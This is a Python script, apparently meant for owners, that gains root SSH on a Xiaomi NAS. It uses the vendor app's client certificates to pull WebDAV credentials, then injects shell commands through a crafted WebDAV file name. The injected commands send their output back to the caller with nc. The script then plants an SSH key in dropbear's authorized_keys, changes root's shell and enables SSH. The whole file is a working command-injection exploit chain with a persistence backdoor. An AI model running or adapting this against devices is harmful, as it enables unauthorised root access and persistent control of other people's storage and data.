#!/usr/bin/env python3
"""
Experimental cross-platform Python version of enable-xiaomi-nas-ssh.sh.

Usage:
  NAS_IP=<nas-ip> python3 scripts/enable-xiaomi-nas-ssh-py.py
  python3 scripts/enable-xiaomi-nas-ssh-py.py <nas-ip>
  python3 scripts/enable-xiaomi-nas-ssh-py.py --nas-ip <nas-ip> --cert-dir <dir>

This intentionally lives beside the original bash script and does not replace it.
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import platform
import re
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from typing import Optional, Tuple
from urllib.parse import quote
import http.client


# Keep Windows SSH/console output readable when the caller captures it from UTF-8 terminals.
try:
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")
except Exception:
    pass


class Stepper:
    def __init__(self, nas_ip: str, work_ip: str):
        self.n = 0
        self.nas_ip = nas_ip
        self.work_ip = work_ip

    def step(self, msg: str) -> None:
        self.n += 1
        print(f"\n[{self.n:02d}] {msg}")

    def ok(self, msg: str) -> None:
        print(f"     OK: {msg}")

    def warn(self, msg: str) -> None:
        print(f"     WARN: {msg}")

    def fail(self, msg: str) -> None:
        print(f"     FAIL: {msg}", file=sys.stderr)
        raise SystemExit(1)

    def redact(self, s: str) -> str:
        return s.replace(self.nas_ip, "<NAS_IP>").replace(self.work_ip, "<WORK_IP>")


class ResolvedHTTPSConnection(http.client.HTTPSConnection):
    """HTTPSConnection that connects to connect_host but keeps host for SNI/Host."""

    def __init__(self, host: str, port: int, connect_host: str, context: ssl.SSLContext, timeout: int):
        super().__init__(host=host, port=port, timeout=timeout, context=context)
        self.connect_host = connect_host

    def connect(self) -> None:
        sock = socket.create_connection((self.connect_host, self.port), self.timeout, self.source_address)
        self.sock = self._context.wrap_socket(sock, server_hostname=self.host)


class NasClient:
    def __init__(self, nas_ip: str, server_cn: str, ca_cert: Path, client_cert: Path, client_key: Path):
        self.nas_ip = nas_ip
        self.server_cn = server_cn
        self.context = ssl.create_default_context(cafile=str(ca_cert))
        # Xiaomi's app-generated CA chain can be accepted by curl/OpenSSL but fail
        # Python 3.13's stricter verifier if Basic Constraints are not marked
        # critical. Keep normal hostname/chain verification, but relax only the
        # extra X509_STRICT flag for compatibility with the vendor certs.
        if hasattr(ssl, "VERIFY_X509_STRICT"):
            self.context.verify_flags &= ~ssl.VERIFY_X509_STRICT
        self.context.load_cert_chain(certfile=str(client_cert), keyfile=str(client_key))

    def request(self, port: int, method: str, path: str, *, body: bytes = b"", headers: Optional[dict] = None,
                auth: Optional[str] = None, timeout: int = 20) -> Tuple[int, bytes]:
        headers = dict(headers or {})
        headers.setdefault("Host", self.server_cn if port == 443 else f"{self.server_cn}:{port}")
        if auth:
            token = base64.b64encode(auth.encode()).decode()
            headers["Authorization"] = f"Basic {token}"
        if body and "Content-Length" not in headers:
            headers["Content-Length"] = str(len(body))
        conn = ResolvedHTTPSConnection(self.server_cn, port, self.nas_ip, self.context, timeout)
        try:
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            return resp.status, resp.read()
        finally:
            conn.close()

    def luci_json(self, path: str, obj: dict) -> dict:
        status, data = self.request(443, "POST", path, body=json.dumps(obj).encode(),
                                    headers={"Content-Type": "application/json"}, timeout=15)
        if status < 200 or status >= 300:
            raise RuntimeError(f"HTTP {status}: {data[:200]!r}")
        return json.loads(data.decode())

    def webdav(self, method: str, path: str, creds: str, *, data: bytes = b"", timeout: int = 20) -> int:
        status, _ = self.request(5000, method, path, body=data, auth=creds, timeout=timeout)
        return status


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Enable Xiaomi NAS SSH/root via app cert + WebDAV injection (experimental Python version).")
    p.add_argument("pos_nas_ip", nargs="?", help="NAS IP address")
    p.add_argument("--nas-ip", default=os.environ.get("NAS_IP"), help="NAS IP address; also supports NAS_IP env")
    p.add_argument("--cert-dir", default=os.environ.get("CERT_DIR"), help="Directory containing *_cert.pem, *_private_key.pem, ca_chain.pem")
    p.add_argument("--key-path", default=os.environ.get("KEY_PATH") or str(Path(tempfile.gettempdir()) / "nas-root-key"))
    p.add_argument("--creds-file", default=os.environ.get("CREDS_FILE") or str(Path(tempfile.gettempdir()) / ".wdav_creds"))
    p.add_argument("--listener-port", type=int, default=int(os.environ.get("LISTENER_PORT", "8124")))
    p.add_argument("--skip-ssh-config", action="store_true", help="Do not write ~/.ssh/config alias")
    return p.parse_args()


def default_cert_dirs() -> list[Path]:
    dirs: list[Path] = []
    sysname = platform.system()
    if sysname == "Darwin":
        app = os.environ.get("APP_NAME", "小米智能存储")
        dirs.append(Path(f"/Applications/{app}.app/Contents/Resources/extraResources/cert"))
    elif sysname == "Windows":
        names = ["SmartStorage", "小米智能存储", "MiNas", "Xiaomi Smart Storage", "XiaomiStorage"]
        roots = [os.environ.get("APPDATA"), os.environ.get("LOCALAPPDATA"), os.environ.get("ProgramFiles"), os.environ.get("ProgramFiles(x86)")]
        local_appdata = os.environ.get("LOCALAPPDATA")
        if local_appdata:
            dirs.append(Path(local_appdata) / "minasCert")
        for root in filter(None, roots):
            for name in names:
                base = Path(root) / name
                dirs.extend([
                    base / "cert",
                    base / "extraResources" / "cert",
                    base / "resources" / "extraResources" / "cert",
                    base / "resources" / "extraResources" / "windows" / "cert",
                ])
    else:
        home = Path.home()
        dirs.extend([home / ".config" / "小米智能存储" / "cert", home / ".local/share/小米智能存储/cert"])
    return dirs


def discover_certs(cert_dir_arg: Optional[str]) -> Tuple[Path, Path, Path, str, str]:
    dirs = [Path(cert_dir_arg)] if cert_dir_arg else default_cert_dirs()
    for d in dirs:
        if not d.is_dir():
            continue
        certs = sorted(d.glob("*_cert.pem"))
        for client_cert in certs:
            base = client_cert.name[:-len("_cert.pem")]
            client_key = d / f"{base}_private_key.pem"
            ca_cert = d / "ca_chain.pem"
            if client_key.is_file() and ca_cert.is_file():
                client_cn = get_cert_cn(client_cert)
                server_cn = re.sub(r"\.\d+$", ".0", client_cn)
                return client_cert, client_key, ca_cert, client_cn, server_cn
    searched = "\n".join(f"  - {d}" for d in dirs)
    raise FileNotFoundError(f"cert files not found. Searched:\n{searched}\nUse --cert-dir to specify the app cert directory.")


def get_cert_cn(cert_path: Path) -> str:
    try:
        info = ssl._ssl._test_decode_cert(str(cert_path))  # type: ignore[attr-defined]
        for rdn in info.get("subject", ()):  # ((('commonName','x'),), ...)
            for k, v in rdn:
                if k == "commonName" and v:
                    return v
    except Exception:
        pass
    openssl = shutil.which("openssl")
    if openssl:
        out = subprocess.check_output([openssl, "x509", "-in", str(cert_path), "-noout", "-subject"], text=True)
        m = re.search(r"CN\s*=\s*([^, /]+)", out)
        if m:
            return m.group(1)
    raise RuntimeError(f"cannot parse client CN from {cert_path}")


def local_ip_for(nas_ip: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((nas_ip, 443))
        return s.getsockname()[0]
    finally:
        s.close()


def port_open(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def chmod_private(path: Path) -> None:
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass


def read_or_get_creds(client: NasClient, creds_file: Path, stepper: Stepper) -> str:
    if creds_file.is_file() and creds_file.stat().st_size > 0:
        chmod_private(creds_file)
        return creds_file.read_text().strip()
    j = client.luci_json("/cgi-bin/luci/filemgr/get_pool_info", {"selector": ["webDAV"]})
    if j.get("code") != 0:
        raise RuntimeError(f"get_pool_info failed code={j.get('code')}")
    w = j["data"]["webDAV"]
    creds = f"{w['username']}:{w['password']}"
    creds_file.write_text(creds)
    chmod_private(creds_file)
    return creds


def listener_once(port: int, timeout: int = 45) -> tuple[threading.Thread, dict]:
    box: dict = {"data": b"", "err": None}

    def run() -> None:
        try:
            with socket.socket() as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", port))
                s.listen(1)
                s.settimeout(timeout)
                c, _ = s.accept()
                with c:
                    c.settimeout(3)
                    chunks = []
                    while True:
                        try:
                            d = c.recv(65535)
                        except socket.timeout:
                            break
                        if not d:
                            break
                        chunks.append(d)
                    box["data"] = b"".join(chunks)
        except Exception as e:  # noqa: BLE001
            box["err"] = e

    t = threading.Thread(target=run, daemon=True)
    t.start()
    time.sleep(0.8)
    return t, box


def inject(client: NasClient, creds: str, cmd: str) -> None:
    enc = quote(cmd, safe="")
    path = f"/pool0/video/__x%22%3B{enc}%3B%22__.ts"
    try:
        client.webdav("GET", path, creds, timeout=20)
    except Exception:
        pass


def shell_single_quote(s: str) -> str:
    return s.replace("'", "'\\''")


def inject_capture(client: NasClient, creds: str, cmd: str, work_ip: str, port: int, stepper: Stepper) -> str:
    t, box = listener_once(port)
    inject(client, creds, f"sh -c '{shell_single_quote(cmd)}' 2>&1 | nc {work_ip} {port}")
    t.join(50)
    if box.get("err") and not box.get("data"):
        stepper.warn(f"listener: {box['err']}")
    return stepper.redact(box.get("data", b"").decode(errors="replace"))


def remote_path_expr(path: str) -> str:
    # BusyBox/POSIX printf reliably accepts \0ddd octal escapes; plain \ddd
    # may be printed literally on some NAS firmware builds.
    return "$(printf " + repr(path.replace("/", "\\0057")) + ")"


def run(cmd: list[str], timeout: int = 20) -> subprocess.CompletedProcess[str]:
    # Windows OpenSSH can hang when its stdout is a Python PIPE over an SSH
    # remoting session. Redirect through a real temp file instead.
    if platform.system() == "Windows":
        out_path = Path(tempfile.gettempdir()) / f"nas-root-run-{os.getpid()}-{int(time.time()*1000)}.out"
        with out_path.open("w", encoding="utf-8", errors="replace") as f:
            p = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=f, stderr=subprocess.STDOUT)
            try:
                rc = p.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                p.kill()
                p.wait(timeout=5)
                output = out_path.read_text(encoding="utf-8", errors="replace") if out_path.exists() else ""
                try:
                    out_path.unlink()
                except OSError:
                    pass
                raise subprocess.TimeoutExpired(cmd, timeout, output=output)
        output = out_path.read_text(encoding="utf-8", errors="replace") if out_path.exists() else ""
        try:
            out_path.unlink()
        except OSError:
            pass
        return subprocess.CompletedProcess(cmd, rc, output, None)
    return subprocess.run(cmd, text=True, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout)


def ensure_ssh_key(key_path: Path) -> None:
    if key_path.is_file():
        chmod_private(key_path)
        return
    ssh_keygen = shutil.which("ssh-keygen")
    if not ssh_keygen:
        raise RuntimeError("ssh-keygen not found; install OpenSSH client or pre-create --key-path")
    key_path.parent.mkdir(parents=True, exist_ok=True)
    cp = run([ssh_keygen, "-t", "ed25519", "-f", str(key_path), "-N", "", "-C", f"nas-root-{time.strftime('%Y-%m-%d')}"])
    if cp.returncode != 0:
        raise RuntimeError(cp.stdout)
    chmod_private(key_path)


def update_ssh_config(nas_ip: str, key_path: Path) -> Path:
    ssh_dir = Path.home() / ".ssh"
    ssh_dir.mkdir(mode=0o700, exist_ok=True)
    local_key = ssh_dir / "id_ed25519_xiaomi_nas"
    if key_path.resolve() != local_key.resolve():
        shutil.copy2(key_path, local_key)
        if key_path.with_suffix(key_path.suffix + ".pub").is_file():
            shutil.copy2(key_path.with_suffix(key_path.suffix + ".pub"), local_key.with_suffix(local_key.suffix + ".pub"))
    chmod_private(local_key)
    cfg = ssh_dir / "config"
    text = cfg.read_text() if cfg.exists() else ""
    lines = text.splitlines()
    out = []
    i = 0
    while i < len(lines):
        if lines[i].strip() == "# Xiaomi NAS root SSH":
            i += 1
            while i < len(lines) and not (lines[i].startswith("Host ") or lines[i].startswith("# ")):
                i += 1
            continue
        out.append(lines[i]); i += 1
    block = f"""
# Xiaomi NAS root SSH
Host xiaomi-nas minas
    HostName {nas_ip}
    User root
    IdentityFile ~/.ssh/id_ed25519_xiaomi_nas
    IdentitiesOnly yes
    StrictHostKeyChecking accept-new
    ConnectTimeout 8
"""
    cfg.write_text("\n".join(out).rstrip() + block + "\n")
    chmod_private(cfg)
    return local_key


def main() -> None:
    args = parse_args()
    nas_ip = args.nas_ip or args.pos_nas_ip
    if not nas_ip:
        print("usage: NAS_IP=<nas-ip> python3 scripts/enable-xiaomi-nas-ssh-py.py  or  python3 ... <nas-ip>", file=sys.stderr)
        raise SystemExit(2)
    work_ip = local_ip_for(nas_ip)
    st = Stepper(nas_ip, work_ip)

    st.step("检查证书目录和 Python TLS")
    try:
        client_cert, client_key, ca_cert, _client_cn, server_cn = discover_certs(args.cert_dir)
    except Exception as e:
        st.fail(str(e))
    st.ok("certs found; identifiers redacted")

    client = NasClient(nas_ip, server_cn, ca_cert, client_cert, client_key)

    st.step("检查 NAS 端口连通性")
    if not port_open(nas_ip, 443):
        st.fail("443 not reachable")
    if not port_open(nas_ip, 5000):
        st.fail("5000 not reachable")
    if port_open(nas_ip, 22):
        st.warn("SSH already appears open")
    else:
        st.ok("443/5000 reachable; SSH not open yet")

    st.step("获取/复用 WebDAV 凭据")
    creds_file = Path(args.creds_file)
    try:
        creds = read_or_get_creds(client, creds_file, st)
    except Exception as e:
        st.fail(str(e))
    username = creds.split(":", 1)[0]
    if not username:
        st.fail("empty WebDAV username")
    st.ok(f"WebDAV credentials ready in {creds_file} (password not printed)")

    st.step("验证 WebDAV 上传")
    status = client.webdav("PUT", "/pool0/data/nas-ssh-test.txt", creds, data=b"hi\n")
    if status not in (201, 204):
        st.fail(f"WebDAV PUT failed: HTTP {status}")
    st.ok("WebDAV PUT success")

    st.step("准备本机监听器")
    st.ok(f"listener will bind 0.0.0.0:{args.listener_port}")

    st.step("验证注入通道延迟")
    start = time.time()
    inject(client, creds, "sleep 3")
    elapsed = round(time.time() - start, 1)
    st.ok(f"sleep injection elapsed {elapsed}s")

    st.step("验证 NAS 侧 root 执行")
    out = inject_capture(client, creds, "id; echo SHELL=$SHELL", work_ip, args.listener_port, st)
    print(out, end="" if out.endswith("\n") else "\n")
    if "uid=0(root)" not in out:
        st.fail("root id not observed")
    st.ok("root command execution confirmed")

    st.step("生成/复用 SSH 密钥")
    key_path = Path(args.key_path)
    try:
        ensure_ssh_key(key_path)
    except Exception as e:
        st.fail(str(e))
    pub_path = Path(str(key_path) + ".pub")
    if not pub_path.is_file():
        st.fail("missing public key")
    st.ok(f"SSH key ready at {key_path} (private key not printed)")

    st.step("创建 WebDAV Docker 目录并上传公钥/脚本")
    client.webdav("MKCOL", "/pool0/data/Docker/", creds)
    if client.webdav("PUT", "/pool0/data/Docker/authorized_keys", creds, data=pub_path.read_bytes()) not in (201, 204):
        st.fail("public key upload failed")
    setkey = f"""#!/bin/sh
mkdir -p /etc/dropbear
touch /etc/dropbear/authorized_keys
while IFS= read -r line; do
    grep -qxF "$line" /etc/dropbear/authorized_keys 2>/dev/null || echo "$line" >> /etc/dropbear/authorized_keys
done < /nas/pool0/{username}/data/Docker/authorized_keys
chmod 600 /etc/dropbear/authorized_keys
echo KEY_OK
""".encode()
    setshell = b"""#!/bin/sh
mkdir -p /runtime 2>/dev/null || true
cp /etc/passwd /runtime/passwd.bak-pre-ssh 2>/dev/null || cp /etc/passwd /tmp/passwd.bak-pre-ssh 2>/dev/null || true
usermod -s /bin/sh root
echo SHELL_OK
"""
    client.webdav("PUT", "/pool0/data/Docker/setkey.sh", creds, data=setkey)
    client.webdav("PUT", "/pool0/data/Docker/setshell.sh", creds, data=setshell)
    st.ok("public key and scripts uploaded")

    st.step("写入 dropbear authorized_keys")
    out = inject_capture(client, creds, f"S=$(echo $PATH|cut -c1); sh ${{S}}nas${{S}}pool0${{S}}{username}${{S}}data${{S}}Docker${{S}}setkey.sh", work_ip, args.listener_port, st)
    print(out, end="" if out.endswith("\n") else "\n")
    if "KEY_OK" not in out:
        st.fail("KEY_OK not observed")
    st.ok("authorized_keys installed")

    st.step("修改 root shell 为 /bin/sh")
    out = inject_capture(client, creds, f"S=$(echo $PATH|cut -c1); sh ${{S}}nas${{S}}pool0${{S}}{username}${{S}}data${{S}}Docker${{S}}setshell.sh", work_ip, args.listener_port, st)
    print(out, end="" if out.endswith("\n") else "\n")
    if "SHELL_OK" not in out:
        st.fail("SHELL_OK not observed")
    st.ok("root shell updated; /etc/passwd backup created on NAS")

    st.step("启用 dropbear SSH 服务")
    cmd = "systemd-run --unit=enable_ssh --property=Type=oneshot /bin/sh -c 'systemctl enable dropbear.socket && systemctl start dropbear.socket && mitee_tool rpmb set ssh_en true; echo SSH_EN_OK'"
    out = inject_capture(client, creds, cmd, work_ip, args.listener_port, st)
    print(out, end="" if out.endswith("\n") else "\n")
    time.sleep(3)
    if port_open(nas_ip, 22, timeout=3):
        st.ok("SSH port is open")
    else:
        st.warn("SSH port not open yet; trying direct systemctl start")
        inject(client, creds, "systemctl start dropbear.socket")
        time.sleep(2)
    if not port_open(nas_ip, 22, timeout=3):
        st.fail("SSH port still not open")

    st.step("验证 root SSH 登录")
    ssh = shutil.which("ssh")
    if not ssh:
        st.fail("ssh not found; install OpenSSH client")
    cp = run([ssh, "-i", str(key_path), "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=accept-new", "-o", "ConnectTimeout=8", "-o", "ConnectionAttempts=1", f"root@{nas_ip}", "id"], timeout=30)
    print(st.redact(cp.stdout), end="" if cp.stdout.endswith("\n") else "\n")
    if cp.returncode != 0 or "uid=0(root)" not in cp.stdout:
        st.fail("ssh id failed")
    st.ok("SSH root is available")

    if not args.skip_ssh_config:
        st.step("写入本机 SSH config 别名")
        local_key = update_ssh_config(nas_ip, key_path)
        cp = run([ssh, "-F", str(Path.home() / ".ssh" / "config"), "-o", "BatchMode=yes", "xiaomi-nas", "id"], timeout=15)
        print(st.redact(cp.stdout), end="" if cp.stdout.endswith("\n") else "\n")
        if cp.returncode != 0:
            st.fail("ssh config alias test failed")
        st.ok("SSH alias ready: ssh xiaomi-nas")
    else:
        local_key = key_path

    st.step("完成")
    st.ok(f"Keep private key: {local_key}")
    st.ok(f"Keep WebDAV creds local: {creds_file}")


if __name__ == "__main__":
    main()
